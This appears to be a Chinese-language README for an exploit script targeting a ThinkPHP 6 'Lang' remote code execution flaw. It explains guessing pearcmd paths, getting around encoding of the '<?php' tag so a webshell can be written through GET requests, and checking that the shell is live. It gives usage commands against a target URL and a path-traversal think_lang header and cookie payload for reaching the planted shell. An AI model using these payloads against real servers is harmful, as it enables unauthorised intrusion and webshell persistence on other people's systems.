# thinkphp_Lang_exp
thinkphp6 Lang RCE exp


### 说明
猜解常用pearcmd路径

解决GET请求时写入webshell 特殊字符自动编码问题，造成找不到有效　<?php 标记 ，文件将无法解析。
如：< >编码 %3c%3e 

验证webshell有效性


### 使用方法：

```bash
#默认
python3 thinkphp_Lang_exp.py -u http://xxxx/index.php

#自定义
python3 thinkphp_Lang_exp.py -u http://xxxx/index.php -m ../../pearcmd_path -p /tmp/shell.php
```

### 利用
**GET连接shell**

get: http://url/?1=phpinfo()

设置请求头:
```
think_lang: ../../../../../../../../../../../tmp/eeew
#or
Cookie: think_lang=../../../../../../../../../../../tmp/eeew
```


**POST连接shell**
参考exp

### 分析文章：

https://mp.weixin.qq.com/s/GWZ_X_jFdrq5TQW2otSL5Q
